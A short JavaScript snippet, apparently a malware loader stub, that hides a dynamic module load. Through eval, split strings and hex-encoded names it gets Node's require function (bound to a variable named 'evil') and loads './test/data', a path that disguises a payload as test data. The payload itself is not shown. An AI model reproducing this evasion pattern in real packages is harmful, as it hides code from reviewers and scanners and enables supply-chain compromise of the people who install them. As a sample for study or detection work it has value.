function unhex(r) {
    return Buffer.from(r, "hex").toString();
}

const g = eval("this");
const p = g["pro" + "cess"];

const evil = p["mainMod" + "ule"][unhex("72657175697265")];
const work = evil(unhex("2e2f746573742f64617461"))
